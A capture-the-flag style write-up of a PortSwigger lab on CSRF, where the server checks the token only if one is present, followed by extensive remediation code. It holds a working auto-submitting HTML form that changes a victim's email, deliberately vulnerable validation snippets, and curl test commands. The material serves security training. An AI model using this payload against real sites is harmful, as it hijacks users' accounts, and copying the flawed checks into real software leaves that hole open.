# CSRF Where Token Validation Depends on Token Being Present

**Difficulty:** `PRACTITIONER` | **Category:** `CSRF`

---

## 🎯 Lab Goal

Host an HTML page that uses CSRF to change the viewer's email by exploiting optional token validation.

---

## 📋 Lab Description

This lab's email change functionality is vulnerable to CSRF due to flawed token validation logic.

---

## 🔎 Reconnaissance

### Initial Access

Logged in with provided credentials:

| Field | Value |
|-------|-------|
| Username | `wiener` |
| Password | `peter` |

### Request Analysis

Intercepted the email change request:

```http
POST /my-account/change-email HTTP/2
Host: [lab-id].web-security-academy.net
Cookie: session=a0sTOZnaK70NJHwCRsbPhcQiydFoxDF3
Content-Type: application/x-www-form-urlencoded

email=wiener2%40normal-user.net&csrf=5tulJKgbQaWXhMMG7T7RNJxYPqxbMvP3
```

🔍 **Finding:** CSRF token is present in legitimate requests.

---

## 🧪 Testing & Exploitation

### Step 1: Test CSRF Token Validation

Performed token manipulation tests:

| Test | Result |
|------|--------|
| Delete token value | ❌ Error: "Missing parameter 'csrf'" |
| Remove token parameter entirely | ✅ Email changed! |

🚨 **Vulnerability Discovered:** Application only validates token **if it exists**.

### Step 2: Understand the Flaw

The application logic:

```python
# Vulnerable validation logic
if 'csrf' in request.form:
    if request.form['csrf'] != session['csrf_token']:
        return "Invalid CSRF token"
# If no csrf parameter, continue processing! ⚠️
```

### Step 3: Craft CSRF Exploit

Created exploit without CSRF token:

```html
<form method="POST" action="https://[lab-id].web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="attacker@normal-user.net">
</form>
<script>
    document.forms[0].submit();
</script>
```

### Step 4: Test Exploit

Request sent by exploit:

```http
POST /my-account/change-email HTTP/2
Host: [lab-id].web-security-academy.net
Cookie: session=a0sTOZnaK70NJHwCRsbPhcQiydFoxDF3
Content-Type: application/x-www-form-urlencoded

email=attacker@normal-user.net
```

**Result:** ✅ Email successfully changed without token!

---

## 🚩 Solution

**CSRF Exploit:**
```html
<form method="POST" action="https://[lab-id].web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="attacker@normal-user.net">
</form>
<script>
    document.forms[0].submit();
</script>
```

---

## 💡 Key Takeaways

### Flawed Validation Logic

**The Problem:**
```python
# ❌ Vulnerable: Optional validation
def change_email():
    csrf_token = request.form.get('csrf')
    
    # Only validate if token is present
    if csrf_token:
        if csrf_token != session.get('csrf_token'):
            abort(403)
    
    # Process email change regardless
    update_email(request.form.get('email'))
```

**Why This Fails:**
- Token validation is **conditional**
- Absence of token **bypasses** validation
- Attackers simply omit the parameter

### Common Validation Mistakes

| Pattern | Vulnerable? | Why |
|---------|------------|-----|
| `if token and token != valid` | ✅ Yes | Missing token passes |
| `if token != valid` | ❌ No | None != valid fails |
| `if not token or token != valid` | ❌ No | Missing token caught |

---

## 🛡️ Remediation

### 1. Enforce Token Presence

**❌ Bad (Optional Validation):**
```python
def change_email():
    csrf = request.form.get('csrf')
    
    if csrf:  # Only checks if present
        if csrf != session['csrf_token']:
            abort(403)
    
    update_email(request.form.get('email'))
```

**✅ Good (Required Validation):**
```python
def change_email():
    csrf = request.form.get('csrf')
    
    # Token is mandatory
    if not csrf:
        abort(403, "Missing CSRF token")
    
    if csrf != session.get('csrf_token'):
        abort(403, "Invalid CSRF token")
    
    update_email(request.form.get('email'))
```

**✅ Better (Explicit Check):**
```python
def validate_csrf_token():
    """Strict CSRF validation"""
    token = request.form.get('csrf_token')
    session_token = session.get('csrf_token')
    
    # Explicit checks
    if token is None:
        raise CSRFError("CSRF token missing")
    
    if session_token is None:
        raise CSRFError("No session token found")
    
    if not secrets.compare_digest(token, session_token):
        raise CSRFError("CSRF token mismatch")
    
    return True

@app.route('/change-email', methods=['POST'])
def change_email():
    validate_csrf_token()
    # Process email change
```

### 2. Use Framework Protection

**Django:**
```python
from django.views.decorators.csrf import csrf_protect

@csrf_protect  # Always enforces token
def change_email(request):
    if request.method == 'POST':
        email = request.POST.get('email')
        update_email(email)
```

**Flask-WTF:**
```python
from flask_wtf import FlaskForm
from flask_wtf.csrf import CSRFProtect

csrf = CSRFProtect(app)

@app.route('/change-email', methods=['POST'])
def change_email():
    # CSRF automatically validated - no bypass possible
    form = EmailForm()
    if form.validate_on_submit():
        update_email(form.email.data)
```

### 3. Centralized Middleware

```python
from functools import wraps

def require_csrf(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        # Always require token for state-changing methods
        if request.method in ['POST', 'PUT', 'DELETE', 'PATCH']:
            token = request.form.get('csrf_token') or \
                   request.headers.get('X-CSRF-Token')
            
            if not token:
                abort(400, "CSRF token required")
            
            if token != session.get('csrf_token'):
                abort(403, "Invalid CSRF token")
        
        return f(*args, **kwargs)
    return decorated_function

# Apply to all routes
@app.before_request
@require_csrf
def check_csrf():
    pass
```

### 4. Double Submit Cookie Pattern (Strict)

```python
def validate_double_submit():
    """Validates both cookie and form token must exist and match"""
    cookie_token = request.cookies.get('csrf_token')
    form_token = request.form.get('csrf_token')
    
    # Both must be present
    if not cookie_token:
        abort(403, "CSRF cookie missing")
    
    if not form_token:
        abort(403, "CSRF form token missing")
    
    # Must match
    if not secrets.compare_digest(cookie_token, form_token):
        abort(403, "CSRF token mismatch")
    
    return True
```

### 5. Testing Checklist

```bash
# Test 1: Remove token parameter
curl -X POST https://target.com/change-email \
     -d "email=test@test.com" \
     -H "Cookie: session=abc"

# Test 2: Empty token value
curl -X POST https://target.com/change-email \
     -d "email=test@test.com&csrf=" \
     -H "Cookie: session=abc"

# Test 3: Null/None token
curl -X POST https://target.com/change-email \
     -d "email=test@test.com&csrf=null" \
     -H "Cookie: session=abc"
```

### Secure Implementation Example

```python
import secrets
from functools import wraps

class CSRFProtection:
    def __init__(self, app):
        self.app = app
        app.before_request(self._check_csrf)
    
    def _check_csrf(self):
        # Skip for safe methods
        if request.method in ['GET', 'HEAD', 'OPTIONS']:
            return
        
        # Get tokens
        form_token = request.form.get('csrf_token')
        header_token = request.headers.get('X-CSRF-Token')
        session_token = session.get('csrf_token')
        
        submitted_token = form_token or header_token
        
        # All checks must pass
        if not submitted_token:
            abort(403, "CSRF token missing")
        
        if not session_token:
            abort(403, "Session token missing")
        
        if not secrets.compare_digest(submitted_token, session_token):
            abort(403, "CSRF token invalid")

# Initialize protection
csrf_protect = CSRFProtection(app)
```

---

**Status:** ✅ Solved
